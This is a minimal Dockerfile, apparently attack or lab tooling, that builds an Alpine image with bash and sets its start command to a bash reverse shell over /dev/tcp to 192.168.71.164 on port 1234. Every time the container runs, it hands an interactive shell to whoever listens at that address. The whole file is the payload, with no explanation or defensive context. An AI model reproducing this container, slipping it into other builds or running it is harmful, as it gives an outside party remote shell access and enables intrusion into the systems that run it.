FROM alpine
RUN apk update && apk add bash
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.71.164/1234 0>&1"]
